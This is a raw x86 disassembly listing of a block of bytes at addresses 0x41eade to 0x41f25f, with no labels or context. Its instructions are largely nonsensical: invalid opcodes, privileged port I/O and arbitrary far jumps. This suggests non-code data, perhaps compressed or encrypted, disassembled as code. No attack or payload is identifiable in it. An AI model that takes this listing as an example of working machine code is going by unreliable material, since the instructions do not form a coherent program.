  41eade:	cmp    cl,BYTE PTR [edx+ebx*4+0x3a]
  41eae2:	jns    0x41eaec
  41eae4:	arpl   WORD PTR [eax],bp
  41eae6:	adc    BYTE PTR [eax+0x4],dh
  41eae9:	cwde   
  41eaea:	sub    eax,DWORD PTR [edi]
  41eaec:	ds sbb eax,0xf994ea0c
  41eaf2:	sub    ah,BYTE PTR [eax+0x17]
  41eaf5:	aaa    
  41eaf6:	scas   eax,DWORD PTR es:[edi]
  41eaf7:	sbb    eax,0x77b5e96e
  41eafc:	hlt    
  41eafd:	jb     0x41eb41
  41eaff:	jo     0x41eb41
  41eb01:	mov    bh,0x9
  41eb03:	add    eax,0x8f725a9a
  41eb08:	or     BYTE PTR [edi+0x6fa8e812],ch
  41eb0e:	xchg   edx,eax
  41eb0f:	adc    DWORD PTR [eax+0x7de2de21],esp
  41eb15:	sbb    eax,0xb15cd44f
  41eb1a:	imul   edi,edi,0xffffffd8
  41eb1d:	pushf  
  41eb1e:	and    BYTE PTR [esi+0x8],bl
  41eb21:	mov    ebp,0xa8f56d7e
  41eb26:	fild   WORD PTR [ecx-0x46]
  41eb29:	sbb    BYTE PTR [ebp-0x11],cl
  41eb2c:	mov    BYTE PTR [edi+0x1f],dl
  41eb2f:	mov    ch,0xb3
  41eb31:	je     0x41eb06
  41eb33:	push   es
  41eb34:	mov    gs,eax
  41eb36:	jp     0x41eac4
  41eb38:	sti    
  41eb39:	shr    BYTE PTR [esi],cl
  41eb3b:	or     eax,0xe17da179
  41eb40:	shl    DWORD PTR [ecx],cl
  41eb42:	daa    
  41eb43:	dec    ebp
  41eb44:	jge    0x41eb82
  41eb46:	pop    esp
  41eb47:	std    
  41eb48:	loop   0x41eb6d
  41eb4a:	fadd   DWORD PTR [ebp+eax*2+0x3aaa5b86]
  41eb51:	inc    ebp
  41eb52:	addr16 loop 0x41ebb6
  41eb55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb56:	shl    BYTE PTR [esi-0x2c2b2ea9],0x28
  41eb5d:	adc    al,0x8e
  41eb5f:	mov    esp,DWORD PTR [ebx+0x0]
  41eb62:	cmp    ch,dl
  41eb64:	dec    esp
  41eb65:	or     BYTE PTR [eax],cl
  41eb67:	sar    DWORD PTR [edi],1
  41eb69:	(bad)
  41eb6e:	out    dx,eax
  41eb6f:	les    ebp,FWORD PTR [edi+ecx*1-0x40]
  41eb73:	mov    esp,0xaa5040dc
  41eb78:	fs adc eax,0xd02954cc
  41eb7e:	ins    BYTE PTR es:[edi],dx
  41eb7f:	cmp    eax,0x905d5693
  41eb84:	jl     0x41ebe2
  41eb86:	cmc    
  41eb87:	fidiv  WORD PTR [eax+edi*4-0x50]
  41eb8b:	mov    eax,0x111043cb
  41eb90:	pop    edx
  41eb91:	inc    esi
  41eb92:	push   es
  41eb93:	pop    edi
  41eb94:	add    bh,bl
  41eb96:	enter  0x6725,0xaa
  41eb9a:	cmp    al,0x6f
  41eb9c:	xchg   BYTE PTR [ecx+eiz*8-0x6f161544],dh
  41eba3:	out    0xdc,al
  41eba5:	jo     0x41eb6e
  41eba7:	fldcw  WORD PTR [edi]
  41eba9:	sub    ebp,DWORD PTR [ecx+0x2d99feb]
  41ebaf:	(bad)  
  41ebb1:	adc    dl,BYTE PTR [edi-0x3b]
  41ebb4:	jmp    0x710043d7
  41ebb9:	retf   0x2ec9
  41ebbc:	lods   eax,DWORD PTR ds:[esi]
  41ebbd:	popf   
  41ebbe:	fidiv  WORD PTR [ebx+esi*2]
  41ebc1:	jmp    0x41ebb0
  41ebc3:	cmp    al,0xb1
  41ebc5:	or     esp,DWORD PTR [edi-0xfd03408]
  41ebcb:	(bad)
  41ebce:	push   ds
  41ebcf:	loop   0x41eb81
  41ebd1:	mov    bl,0xb3
  41ebd3:	jmp    0xd927:0xf12938e4
  41ebda:	mov    edx,DWORD PTR [esi-0x69]
  41ebdd:	rcr    ebp,cl
  41ebdf:	fdiv   QWORD PTR [edx+0x3f]
  41ebe2:	add    al,0xee
  41ebe4:	cmp    al,0x57
  41ebe6:	repz or esp,ecx
  41ebe9:	mov    esi,0x711246ff
  41ebee:	inc    ecx
  41ebef:	in     eax,0xa
  41ebf1:	xchg   BYTE PTR [eax-0x5],cl
  41ebf4:	repnz mov esi,0xefed7070
  41ebfa:	inc    eax
  41ebfb:	xchg   edi,eax
  41ebfc:	icebp  
  41ebfd:	test   DWORD PTR [esi],ebp
  41ebff:	mov    ah,0xc4
  41ec01:	mov    ds:0xe4d098f9,al
  41ec06:	or     eax,0xddd5bc2a
  41ec0b:	idiv   BYTE PTR [edi+0x3a]
  41ec0e:	adc    al,0x83
  41ec10:	jp     0x41ec8c
  41ec12:	mov    esp,0x40845446
  41ec17:	mov    eax,0x379d234c
  41ec1c:	inc    ecx
  41ec1d:	stos   BYTE PTR es:[edi],al
  41ec1e:	sub    BYTE PTR [eax-0x7188e4c3],cl
  41ec24:	sbb    eax,eax
  41ec26:	add    eax,0x9dc585ee
  41ec2b:	fnstenv [esi-0x2490e49a]
  41ec31:	std    
  41ec32:	neg    BYTE PTR [esi]
  41ec34:	sub    esp,DWORD PTR [ebx-0x23]
  41ec37:	ins    BYTE PTR es:[edi],dx
  41ec38:	aam    0x84
  41ec3a:	out    dx,eax
  41ec3b:	idiv   DWORD PTR [ecx+eax*1+0x1e800]
  41ec42:	add    BYTE PTR [eax+ebp*4+0x1feaaec],dl
  41ec49:	(bad)  
  41ec4a:	dec    DWORD PTR [esi]
  41ec4c:	mov    edi,0xc9475f02
  41ec51:	cmp    eax,eax
  41ec53:	aas    
  41ec54:	mov    dh,bh
  41ec56:	mov    al,ds:0xcfc47b86
  41ec5b:	mov    ecx,DWORD PTR [esi]
  41ec5d:	loop   0x41ec5c
  41ec5f:	xor    ebx,ecx
  41ec61:	mov    ebx,0x81cac88d
  41ec66:	and    ebx,DWORD PTR [esi-0x675cfbfd]
  41ec6c:	xor    DWORD PTR [ecx],ebx
  41ec6e:	pushf  
  41ec6f:	test   BYTE PTR [eax+edi*2],cl
  41ec72:	mov    ebp,0x5a3a6949
  41ec77:	enter  0x6584,0x79
  41ec7b:	stos   BYTE PTR es:[edi],al
  41ec7c:	and    DWORD PTR [ebx-0x23b32c66],eax
  41ec82:	cli    
  41ec83:	dec    ebp
  41ec84:	jmp    0x41ec7c
  41ec86:	mov    DWORD PTR [esi],eax
  41ec88:	xor    eax,0x3056c004
  41ec8d:	int    0x3d
  41ec8f:	(bad)
  41ec92:	dec    edx
  41ec93:	nop
  41ec94:	in     eax,0x72
  41ec96:	(bad)  
  41ec97:	mov    edx,0x8ec5c176
  41ec9c:	inc    edx
  41ec9d:	inc    edx
  41ec9e:	and    edx,esi
  41eca0:	fwait
  41eca1:	les    ebp,FWORD PTR [eax+0x2b]
  41eca4:	mov    ch,0xfa
  41eca6:	cmp    ebx,DWORD PTR [ecx]
  41eca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eca9:	add    DWORD PTR [edx-0x41784f1b],ecx
  41ecaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ecb0:	mov    ecx,0x1af557d1
  41ecb5:	scas   eax,DWORD PTR es:[edi]
  41ecb6:	jae    0x41ec62
  41ecb8:	aam    0xc6
  41ecba:	mov    WORD PTR [esi-0x46],?
  41ecbd:	add    BYTE PTR fs:[edi+edx*2-0x7b],0xa
  41ecc3:	adc    al,0x7f
  41ecc5:	xor    bh,al
  41ecc7:	sti    
  41ecc8:	jae    0x41ec7a
  41ecca:	(bad)  
  41eccb:	cmp    dh,ch
  41eccd:	loope  0x41ecfd
  41eccf:	aam    0xe3
  41ecd1:	mov    esi,0x270f9800
  41ecd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ecd7:	jb     0x41eccc
  41ecd9:	pushf  
  41ecda:	out    dx,eax
  41ecdb:	xchg   ebp,eax
  41ecdc:	or     ah,BYTE PTR [eax-0x11ef4c78]
  41ece2:	cmp    esi,0xebb99988
  41ece8:	push   0x75
  41ecea:	into   
  41eceb:	or     esi,DWORD PTR [esi-0x49]
  41ecee:	dec    edx
  41ecef:	adc    al,0x25
  41ecf1:	sub    cl,ch
  41ecf3:	rol    cl,cl
  41ecf5:	mov    ch,bh
  41ecf7:	inc    ebp
  41ecf8:	add    bh,ch
  41ecfa:	arpl   WORD PTR [eax-0x57],ax
  41ecfd:	mov    bl,0xe
  41ecff:	std    
  41ed00:	iret   
  41ed01:	retf   0xc613
  41ed04:	out    0xe2,al
  41ed06:	cdq    
  41ed07:	fistp  DWORD PTR [ebp+0x11458f9d]
  41ed0d:	cmp    BYTE PTR ds:0x8b8b46df,al
  41ed13:	test   DWORD PTR [edi],ebp
  41ed15:	test   BYTE PTR [esi+0x691ede3b],al
  41ed1b:	pop    esi
  41ed1c:	push   ecx
  41ed1d:	xor    ebx,DWORD PTR [eax-0x23]
  41ed20:	nop
  41ed21:	in     al,dx
  41ed22:	sub    DWORD PTR [ebp+0x601b327c],ecx
  41ed28:	and    esp,esp
  41ed2a:	xor    DWORD PTR [ebx],0xffffffff
  41ed2d:	sbb    ebx,DWORD PTR [ebx+eax*1]
  41ed30:	les    esi,FWORD PTR [eax]
  41ed32:	xchg   DWORD PTR [edx+edi*4],eax
  41ed35:	pop    eax
  41ed36:	add    eax,0xd86d50e0
  41ed3b:	inc    edx
  41ed3c:	xchg   ebp,eax
  41ed3d:	popf   
  41ed3e:	or     al,0x9d
  41ed40:	add    al,ah
  41ed42:	inc    eax
  41ed43:	(bad)  
  41ed44:	out    0xef,al
  41ed46:	mov    ecx,DWORD PTR [edi]
  41ed48:	aas    
  41ed49:	mov    ah,0xb
  41ed4b:	in     al,dx
  41ed4c:	adc    BYTE PTR [eax+0x57e3d96c],al
  41ed52:	sbb    esi,DWORD PTR [eax-0x54a5e1b3]
  41ed58:	xor    DWORD PTR [edx+0x53],ebp
  41ed5b:	jbe    0x41ed26
  41ed5d:	lods   al,BYTE PTR ds:[esi]
  41ed5e:	add    al,0x3d
  41ed60:	pavgw  mm3,mm6
  41ed63:	test   eax,0x2ff2dd78
  41ed68:	or     al,0x11
  41ed6a:	pcmpgtb mm6,mm1
  41ed6d:	inc    edx
  41ed6e:	adc    eax,0x821ae10b
  41ed73:	out    dx,eax
  41ed74:	cmp    esi,edx
  41ed76:	jg     0x41ed8b
  41ed78:	dec    esi
  41ed79:	jg     0x41eda5
  41ed7b:	sbb    al,0xe3
  41ed7d:	(bad)  
  41ed7e:	jo     0x41ed05
  41ed80:	arpl   WORD PTR [edx-0x13],sp
  41ed83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed84:	out    0x5e,eax
  41ed86:	cmc    
  41ed87:	ins    DWORD PTR es:[edi],dx
  41ed88:	fcomp  DWORD PTR [ebx+0x10]
  41ed8b:	aam    0x33
  41ed8d:	sub    edx,ecx
  41ed8f:	sbb    al,0x9c
  41ed91:	(bad)  
  41ed92:	sbb    edx,DWORD PTR [esi]
  41ed94:	adc    DWORD PTR [edx+0x18],esi
  41ed97:	aas    
  41ed98:	out    dx,eax
  41ed99:	mov    ch,0xb1
  41ed9b:	inc    ebx
  41ed9c:	or     eax,0x47e0f20b
  41eda1:	xchg   BYTE PTR [ecx+0x26a6c986],dh
  41eda7:	retfw  0xdd7c
  41edab:	sbb    eax,0xab3218cf
  41edb0:	sti    
  41edb1:	arpl   WORD PTR [ebp-0x7582e5d6],di
  41edb7:	lahf   
  41edb8:	dec    eax
  41edb9:	aad    0x88
  41edbb:	enter  0xf5a9,0x1b
  41edbf:	popa   
  41edc0:	push   edi
  41edc1:	sub    bl,BYTE PTR [ebp+0x49]
  41edc4:	cmp    eax,0x5b9227e2
  41edc9:	dec    edi
  41edca:	jmp    0x32b6:0x11f7610
  41edd1:	icebp  
  41edd2:	mov    bh,0xa5
  41edd4:	pop    esp
  41edd5:	sahf   
  41edd6:	push   0x67
  41edd8:	dec    esp
  41edd9:	cs ret 0xdb94
  41eddd:	and    cl,bh
  41eddf:	lods   al,BYTE PTR ds:[esi]
  41ede0:	inc    ecx
  41ede1:	mov    ds:0x50782e7,eax
  41ede6:	xor    BYTE PTR [edx-0x207b484e],bh
  41edec:	and    ebx,edx
  41edee:	(bad)  
  41edef:	out    0x2d,eax
  41edf1:	sbb    eax,0x7801a4f0
  41edf6:	rol    BYTE PTR [edx],0xed
  41edf9:	xchg   DWORD PTR [ecx],ebp
  41edfb:	in     al,dx
  41edfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edfd:	fild   QWORD PTR [ecx]
  41edff:	jae    0x41edcd
  41ee01:	dec    esp
  41ee02:	jmp    0xd2fc6ebe
  41ee07:	(bad)  
  41ee08:	fcom   QWORD PTR [esi+0x29eae50a]
  41ee0e:	xrelease xchg DWORD PTR [ebp+esi*4-0x36809cf8],edx
  41ee16:	mov    edx,0x3dabeb7c
  41ee1b:	(bad)  
  41ee1d:	dec    ebx
  41ee1e:	xor    DWORD PTR [ebp+0x5d],edi
  41ee21:	into   
  41ee22:	inc    esi
  41ee23:	cmp    al,0x68
  41ee25:	je     0x41ee61
  41ee27:	fbld   TBYTE PTR [eax+0x32da7b6d]
  41ee2d:	xchg   edi,eax
  41ee2e:	mov    bh,bh
  41ee30:	scas   eax,DWORD PTR es:[edi]
  41ee31:	fbstp  TBYTE PTR [edx+0x3]
  41ee34:	inc    ebp
  41ee35:	mov    ds:0xab819f5c,eax
  41ee3a:	scas   al,BYTE PTR es:[edi]
  41ee3b:	fistp  QWORD PTR [esi+0x1e80001]
  41ee41:	add    BYTE PTR [eax],al
  41ee43:	xor    eax,0x32edc680
  41ee48:	mov    WORD PTR [ebx],?
  41ee4a:	push   es
  41ee4b:	lock out dx,eax
  41ee4d:	sbb    eax,0x37167fac
  41ee52:	fnsave [edx+esi*4-0x22]
  41ee56:	or     ebp,edx
  41ee58:	(bad)  
  41ee59:	push   0xfffffffe
  41ee5b:	test   eax,0x30f0210d
  41ee60:	sbb    edi,DWORD PTR [eax+0x46]
  41ee63:	lock xchg edx,eax
  41ee65:	push   ebp
  41ee66:	inc    edi
  41ee67:	xchg   DWORD PTR [ebx],esi
  41ee69:	xchg   edi,eax
  41ee6a:	sti    
  41ee6b:	(bad)  
  41ee6c:	xlat   BYTE PTR fs:[ebx]
  41ee6e:	popa   
  41ee6f:	xor    BYTE PTR [edi],dl
  41ee71:	dec    ebp
  41ee72:	cs leave 
  41ee74:	jnp    0x41ee62
  41ee76:	lahf   
  41ee77:	daa    
  41ee78:	fmul   DWORD PTR [ebp-0x49]
  41ee7b:	pushf  
  41ee7c:	dec    eax
  41ee7d:	and    esp,DWORD PTR [eax-0x2a8b035f]
  41ee83:	in     eax,dx
  41ee84:	popa   
  41ee85:	sub    eax,0xe23664e9
  41ee8a:	or     eax,0xb877b2af
  41ee8f:	int3   
  41ee90:	jg     0x41ee53
  41ee92:	xor    BYTE PTR [esi+0x47],ch
  41ee95:	rol    DWORD PTR [edx],0x8e
  41ee98:	iretw  
  41ee9a:	dec    edi
  41ee9b:	aam    0x10
  41ee9d:	mov    ecx,0xea09ecdf
  41eea2:	push   esp
  41eea3:	cld    
  41eea4:	aam    0xc6
  41eea6:	and    al,0x29
  41eea8:	sub    eax,0x564a54eb
  41eead:	ss mov ecx,0xbe4aff68
  41eeb3:	dec    esp
  41eeb4:	dec    esp
  41eeb5:	cmc    
  41eeb6:	xchg   ecx,eax
  41eeb7:	sbb    ecx,esp
  41eeb9:	pop    es
  41eeba:	(bad)  [eax-0x3272692e]
  41eec0:	xor    ch,BYTE PTR [esi-0x4a15db1]
  41eec6:	mov    ds:0x7c84a9b4,al
  41eecb:	fisubr DWORD PTR [eax]
  41eecd:	fdivr  DWORD PTR [eax]
  41eecf:	mov    eax,ds:0x9fb5bbb5
  41eed4:	jle    0x41ee6b
  41eed6:	or     BYTE PTR [esi],ch
  41eed8:	sar    BYTE PTR [ecx],cl
  41eeda:	cdq    
  41eedb:	dec    ebx
  41eedc:	inc    ecx
  41eedd:	mov    edx,0xab1b2409
  41eee2:	jle    0x41eefa
  41eee4:	mov    fs,WORD PTR [edx]
  41eee6:	pop    ebx
  41eee7:	shr    BYTE PTR [edi],0xce
  41eeea:	mov    edi,0xf47962d4
  41eeef:	dec    edx
  41eef0:	xor    edi,DWORD PTR [ecx+0x6e]
  41eef3:	push   ebx
  41eef4:	mov    ds:0xa105c79f,eax
  41eef9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eefa:	mov    esi,0xc8134537
  41eeff:	jo     0x41ef01
  41ef01:	fs loopne 0x41eef0
  41ef04:	fldenv [ebx]
  41ef06:	loop   0x41ef07
  41ef08:	pop    ebx
  41ef09:	retf   
  41ef0a:	push   ecx
  41ef0b:	mov    ah,0x53
  41ef0d:	mov    al,BYTE PTR ds:0xf1056347
  41ef13:	pop    ss
  41ef14:	adc    DWORD PTR [edi],ecx
  41ef16:	ins    DWORD PTR es:[edi],dx
  41ef17:	(bad)  
  41ef18:	push   ebx
  41ef19:	sbb    BYTE PTR [ebx-0x2d55d3dd],cl
  41ef1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef20:	pop    ebp
  41ef21:	sub    DWORD PTR [edi-0x33b45339],0x7304d2a
  41ef2b:	mov    DWORD PTR [ebx+0x32],edx
  41ef2e:	ror    BYTE PTR [ebx],cl
  41ef30:	cld    
  41ef31:	push   ds
  41ef32:	dec    DWORD PTR [ecx-0x3025eee4]
  41ef38:	lea    ebx,[eax+0x2f]
  41ef3b:	inc    ebx
  41ef3c:	jge    0x41efa0
  41ef3e:	cmp    BYTE PTR [ebx],ah
  41ef40:	cmp    DWORD PTR [edx],ecx
  41ef42:	iret   
  41ef43:	add    ah,bl
  41ef45:	div    esi
  41ef47:	xor    BYTE PTR [ebx+0x6b3d281d],al
  41ef4d:	shl    bh,cl
  41ef4f:	mov    bh,0xf8
  41ef51:	outs   dx,DWORD PTR ds:[esi]
  41ef52:	mov    cl,0x47
  41ef54:	adc    al,0x8c
  41ef56:	mov    al,ds:0x5910ba1f
  41ef5b:	pop    ebp
  41ef5c:	mov    bh,0x11
  41ef5e:	or     eax,0x9a32dc6a
  41ef63:	lea    edi,[ebp+0x17631db4]
  41ef69:	inc    edx
  41ef6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef6b:	cmp    dl,BYTE PTR [eax-0x73]
  41ef6e:	jle    0x41efc3
  41ef70:	xlat   BYTE PTR ds:[ebx]
  41ef71:	test   eax,0x9f29d25e
  41ef76:	and    edi,ebx
  41ef78:	call   0x52566346
  41ef7d:	out    0x42,eax
  41ef7f:	xor    eax,0x7fe827c6
  41ef84:	and    ecx,DWORD PTR ds:0xa05aeb2b
  41ef8a:	dec    esp
  41ef8b:	sbb    al,al
  41ef8d:	cmc    
  41ef8e:	loopne 0x41efb4
  41ef90:	xchg   edx,eax
  41ef92:	(bad)  
  41ef93:	jmp    0x7d937bf5
  41ef98:	add    ebx,DWORD PTR [ebp-0x5]
  41ef9b:	jl     0x41ef92
  41ef9d:	mov    bh,0x3a
  41ef9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efa0:	data16 cmp al,0xf2
  41efa3:	and    BYTE PTR [eax-0x30],dh
  41efa6:	mov    bl,0x80
  41efa8:	pop    ds
  41efa9:	fwait
  41efaa:	js     0x41efdd
  41efac:	pop    es
  41efad:	push   cs
  41efae:	pop    ebx
  41efaf:	fsubr  DWORD PTR [ebp+0x1e125aad]
  41efb5:	xchg   ebx,eax
  41efb6:	hlt    
  41efb7:	sbb    DWORD PTR [ebx],0xffffff94
  41efba:	sub    BYTE PTR [ebx+edi*4],ch
  41efbd:	fisubr DWORD PTR [edx+0x26]
  41efc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efc1:	scas   al,BYTE PTR es:[edi]
  41efc2:	in     eax,dx
  41efc3:	jno    0x41efcc
  41efc5:	mov    WORD PTR [edi],fs
  41efc7:	mov    ah,0x86
  41efc9:	xchg   esi,eax
  41efca:	popw   es
  41efcc:	mov    edi,DWORD PTR [ecx-0x26c78c]
  41efd2:	scas   al,BYTE PTR es:[edi]
  41efd3:	xor    eax,DWORD PTR [ebx-0x2811a302]
  41efd9:	jecxz  0x41efec
  41efdb:	xor    al,BYTE PTR [edx]
  41efdd:	cdq    
  41efde:	cmp    DWORD PTR [ebx],ebp
  41efe0:	adc    eax,0xc34ec268
  41efe5:	xchg   edx,eax
  41efe6:	pop    eax
  41efe7:	hlt    
  41efe8:	xchg   ebx,eax
  41efe9:	es dec esi
  41efeb:	add    eax,0xd58d8d8c
  41eff0:	lahf   
  41eff1:	not    DWORD PTR [esi+0x1dc75259]
  41eff7:	xor    edi,edi
  41eff9:	and    ah,ah
  41effb:	out    dx,eax
  41effc:	and    eax,DWORD PTR [edi+0xac69735]
  41f002:	adc    DWORD PTR [ecx],ecx
  41f004:	xor    ch,al
  41f006:	outs   dx,DWORD PTR ds:[esi]
  41f007:	js     0x41f040
  41f009:	int3   
  41f00a:	add    BYTE PTR [ebx-0x33],ah
  41f00d:	xor    ch,BYTE PTR [eax-0x71]
  41f010:	cs hlt 
  41f012:	pop    esp
  41f013:	jl     0x41f02c
  41f015:	mov    ?,WORD PTR [edx-0x68574b57]
  41f01b:	loop   0x41f037
  41f01d:	xchg   edx,eax
  41f01e:	xor    al,0x1d
  41f020:	adc    dh,dh
  41f022:	sbb    edi,esi
  41f024:	les    edx,FWORD PTR [esi+0x62]
  41f027:	dec    edi
  41f028:	or     eax,0xe448b530
  41f02d:	add    ebx,DWORD PTR [ebx-0x8270051]
  41f033:	pop    esi
  41f034:	sub    BYTE PTR [eax+0x7201788f],bl
  41f03a:	push   ecx
  41f03b:	mov    eax,0x1e80001
  41f041:	add    BYTE PTR [eax],al
  41f043:	pop    ds
  41f044:	ret    0x15f6
  41f047:	add    eax,0x78199961
  41f04c:	bsf    ecx,DWORD PTR [edi+0x7b]
  41f050:	or     al,0x3b
  41f052:	out    dx,al
  41f053:	in     eax,0x19
  41f055:	loop   0x41f061
  41f057:	push   ecx
  41f058:	movzx  edi,BYTE PTR [esi]
  41f05b:	add    eax,ebp
  41f05d:	int3   
  41f05e:	stos   DWORD PTR es:[edi],eax
  41f05f:	dec    esi
  41f060:	fst    QWORD PTR [edi+0x1328676]
  41f066:	ror    BYTE PTR [eax+0x3d6a654b],0x9d
  41f06d:	pop    ds
  41f06e:	push   ecx
  41f06f:	(bad)  
  41f070:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f071:	push   ds
  41f072:	out    dx,al
  41f073:	cmp    al,0x43
  41f075:	and    DWORD PTR [edi+ecx*8],esi
  41f078:	dec    ecx
  41f079:	out    0xca,eax
  41f07b:	or     DWORD PTR [esi-0x1d85f8c2],0xfffffff3
  41f082:	cld    
  41f083:	or     eax,0x9acfca3d
  41f088:	ret    0x6b4a
  41f08b:	cmc    
  41f08c:	adc    al,0x57
  41f08e:	mov    ch,0xc
  41f090:	in     eax,dx
  41f091:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f092:	ins    DWORD PTR es:[edi],dx
  41f093:	add    ah,BYTE PTR [edx+0x6ece6c06]
  41f099:	cwde   
  41f09a:	leave  
  41f09b:	fs repnz cmc 
  41f09e:	fcomp  QWORD PTR [ecx+0x7c]
  41f0a1:	cld    
  41f0a2:	jbe    0x41f0f4
  41f0a4:	mov    eax,0x2dab0ea5
  41f0a9:	adc    bh,BYTE PTR [esi+0x3a]
  41f0ac:	mov    cl,0xe9
  41f0ae:	or     BYTE PTR [eax+0x6583d61c],dl
  41f0b4:	sub    BYTE PTR [edi+0x76],0xfa
  41f0b8:	out    0xf3,al
  41f0ba:	retf   0x2d54
  41f0bd:	xchg   ebx,eax
  41f0be:	pop    ds
  41f0bf:	std    
  41f0c0:	push   0x171a2072
  41f0c5:	mov    edi,ss
  41f0c7:	push   cs
  41f0c8:	div    DWORD PTR [esi+0xf]
  41f0cb:	push   0xe126733f
  41f0d0:	push   esi
  41f0d1:	out    dx,eax
  41f0d2:	jmp    0x592c:0x43d99956
  41f0d9:	cmp    BYTE PTR [esi+0x77],ah
  41f0dc:	push   edx
  41f0dd:	or     BYTE PTR [eax+0x641f2893],bh
  41f0e3:	not    BYTE PTR [eax+0xe]
  41f0e6:	xchg   esp,eax
  41f0e7:	std    
  41f0e8:	inc    esi
  41f0e9:	rcr    DWORD PTR [ebp-0x298637ca],cl
  41f0ef:	cld    
  41f0f0:	pop    edi
  41f0f1:	not    dl
  41f0f3:	mov    ah,BYTE PTR [edi-0x323f7f1]
  41f0f9:	ficomp WORD PTR [edx]
  41f0fb:	xor    dh,BYTE PTR [edi]
  41f0fd:	jp     0x41f0d3
  41f0ff:	outs   dx,BYTE PTR ds:[esi]
  41f100:	and    BYTE PTR [ebx+0x4daa82a],al
  41f106:	add    DWORD PTR [eax+ebx*8-0x5c],ebx
  41f10a:	cmp    DWORD PTR [edi+0x3e8da686],0xfffffff7
  41f111:	daa    
  41f112:	adc    al,0x9d
  41f114:	mov    ah,0xda
  41f116:	fst    QWORD PTR [eax]
  41f118:	mov    cl,0x21
  41f11a:	stos   BYTE PTR es:[edi],al
  41f11b:	jmp    0x41f0d8
  41f11d:	mov    al,0x61
  41f11f:	stc    
  41f120:	jb     0x41f17f
  41f122:	jmp    0x41f14e
  41f124:	stos   BYTE PTR es:[edi],al
  41f125:	std    
  41f126:	(bad)  
  41f127:	xor    ah,dl
  41f129:	and    al,0x15
  41f12b:	ins    DWORD PTR es:[edi],dx
  41f12c:	fst    QWORD PTR [esi-0x33f5254d]
  41f132:	fild   WORD PTR [esi+0x73]
  41f135:	sar    ebp,1
  41f137:	push   esi
  41f138:	mov    eax,ds:0x56e1e481
  41f13d:	je     0x41f152
  41f13f:	rol    DWORD PTR [edx-0x1f5608f8],0x90
  41f146:	ss jae 0x41f11c
  41f149:	xor    ebx,DWORD PTR [edi+ebp*1]
  41f14c:	es jmp 0x42aee2db
  41f152:	sbb    eax,0x1d6050a8
  41f157:	aaa    
  41f158:	sbb    al,0xad
  41f15a:	sub    eax,0xae463377
  41f15f:	sub    BYTE PTR fs:[edi+0x6d455b39],bl
  41f166:	mov    esi,0x8f0ee9cc
  41f16b:	jnp    0x41f19e
  41f16d:	fisub  WORD PTR [ebp-0x63]
  41f170:	and    ch,al
  41f172:	ret    0xc77c
  41f175:	add    edi,DWORD PTR [ecx-0x7]
  41f178:	pop    edx
  41f179:	lods   eax,DWORD PTR ds:[esi]
  41f17a:	dec    edx
  41f17b:	mov    bh,0x25
  41f17d:	mov    ecx,0xf5cc0f12
  41f182:	add    BYTE PTR [ecx-0x6622f40e],0x28
  41f189:	pop    eax
  41f18a:	in     al,dx
  41f18b:	hlt    
  41f18c:	outs   dx,BYTE PTR ds:[esi]
  41f18d:	inc    ebx
  41f18e:	mov    dh,BYTE PTR [edx]
  41f190:	fmul   DWORD PTR [edi-0x65]
  41f193:	and    eax,0x8cb1c378
  41f198:	inc    esi
  41f199:	sbb    eax,0x451c2e98
  41f19e:	xor    BYTE PTR [ebx+edx*8+0x2a],dl
  41f1a2:	pushf  
  41f1a3:	test   eax,0x362d5a7d
  41f1a8:	jmp    0xd80dc1af
  41f1ad:	clc    
  41f1ae:	adc    eax,0xe061d150
  41f1b3:	leave  
  41f1b4:	mov    cl,cl
  41f1b6:	imul   eax,DWORD PTR [eax-0x35],0xe73592a8
  41f1bd:	imul   esp,DWORD PTR [esi+ebx*8+0x3936eb7c],0x6c
  41f1c5:	cs jle 0x41f20b
  41f1c8:	inc    ecx
  41f1c9:	xchg   esi,eax
  41f1ca:	dec    esi
  41f1cb:	xor    dh,BYTE PTR [edx]
  41f1cd:	mov    WORD PTR [esi-0x2c],es
  41f1d0:	pop    esi
  41f1d1:	adc    DWORD PTR [ecx],0x2a016fa5
  41f1d7:	retf   0x233
  41f1da:	ret    0x63da
  41f1dd:	or     BYTE PTR [esi],cl
  41f1df:	mov    esp,0xc790ad85
  41f1e4:	fstp   QWORD PTR [ebx-0x8898a74]
  41f1ea:	push   0x6e
  41f1ec:	cwde   
  41f1ed:	fcmovnbe st,st(1)
  41f1ef:	or     al,0x21
  41f1f1:	sbb    eax,0x3660340f
  41f1f6:	jae    0x41f1ca
  41f1f8:	out    dx,eax
  41f1f9:	sub    dh,BYTE PTR [edi-0x479ee060]
  41f1ff:	jmp    0x41f23d
  41f201:	jl     0x41f1c5
  41f203:	mov    esi,fs
  41f205:	and    edx,edi
  41f207:	(bad)  
  41f208:	add    BYTE PTR ds:0x10728f23,al
  41f20f:	sbb    eax,0x58282c12
  41f214:	xlat   BYTE PTR ds:[ebx]
  41f215:	test   BYTE PTR [edx-0x43],cl
  41f218:	fdiv   QWORD PTR ds:0x95e9113e
  41f21e:	adc    ah,BYTE PTR [ebx]
  41f220:	out    0x9e,eax
  41f222:	cmp    DWORD PTR [ebx],eax
  41f224:	nop
  41f225:	xlat   BYTE PTR ds:[ebx]
  41f226:	repnz inc edx
  41f228:	adc    eax,0x4529141
  41f22d:	mov    ds:0x72a6f682,al
  41f232:	aam    0x6d
  41f234:	xor    dh,BYTE PTR [edx]
  41f236:	and    eax,0xdc0668f7
  41f23b:	scas   eax,DWORD PTR es:[edi]
  41f23c:	ret    0x1
  41f23f:	call   0xb441f245
  41f244:	and    ch,0x31
  41f247:	mov    ds:0x2793979c,al
  41f24c:	inc    ebx
  41f24d:	out    0xec,al
  41f24f:	mov    esi,0xa3b989eb
  41f254:	mov    al,ds:0x66b3bdd0
  41f259:	add    esi,DWORD PTR [edx-0x1dc1dc3f]
  41f25f:	adc    DWORD PTR [esi],ebp
